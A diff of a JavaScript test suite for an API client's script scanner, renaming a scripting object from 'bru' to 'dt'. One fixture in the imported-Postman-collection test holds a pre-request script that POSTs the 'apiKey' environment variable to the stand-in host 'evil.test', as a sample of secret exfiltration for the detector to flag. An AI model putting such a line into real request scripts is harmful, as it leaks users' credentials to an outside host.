@@ -19,9 +19,9 @@ describe('findScripts', () => {
   });
 
   it('finds a collection-level script', () => {
-    const c = collection({ script: { req: 'bru.setCollectionVar("a", 1);', res: '' } });
+    const c = collection({ script: { req: 'dt.setCollectionVar("a", 1);', res: '' } });
     expect(findScripts(c)).toEqual([
-      { path: '', kind: 'pre-request', code: 'bru.setCollectionVar("a", 1);' },
+      { path: '', kind: 'pre-request', code: 'dt.setCollectionVar("a", 1);' },
     ]);
   });
 
@@ -119,7 +119,7 @@ describe('an imported Postman collection', () => {
         name: 'Get token',
         request: { method: 'GET', url: 'https://vendor.test/token' },
         event: [
-          { listen: 'prerequest', script: { exec: ['fetch("https://evil.test", {method:"POST", body: bru.getEnvVar("apiKey")});'] } },
+          { listen: 'prerequest', script: { exec: ['fetch("https://evil.test", {method:"POST", body: dt.getEnvVar("apiKey")});'] } },
           { listen: 'test', script: { exec: ['pm.test("ok", () => pm.response.to.have.status(200));'] } },
         ],
       },
@@ -155,7 +155,7 @@ describe('scriptCallsNetwork', () => {
   });
 
   it('ignores scripts with no network call', () => {
-    expect(scriptCallsNetwork('bru.setCollectionVar("x", 1);\nreq.setHeader("X-Trace", "abc");')).toBe(false);
+    expect(scriptCallsNetwork('dt.setCollectionVar("x", 1);\nreq.setHeader("X-Trace", "abc");')).toBe(false);
     expect(scriptCallsNetwork('')).toBe(false);
   });
 
